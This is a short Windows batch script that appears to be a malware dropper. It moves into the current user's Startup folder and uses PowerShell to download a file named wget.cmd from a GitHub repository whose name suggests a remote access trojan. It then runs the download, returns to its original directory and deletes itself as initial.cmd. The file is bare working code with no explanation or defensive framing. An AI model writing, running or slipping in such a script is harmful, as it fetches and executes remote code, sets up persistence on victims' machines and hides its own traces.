@echo off

set "INITIALPATH=%cd%";
set STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup

cd "%STARTUP%"

powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kirillpristavka/ratatatata/refs/heads/main/files/wget.cmd' -OutFile 'wget.cmd'"

powershell ./wget.cmd

cd "%INITIALPATH%"

del initial.cmd
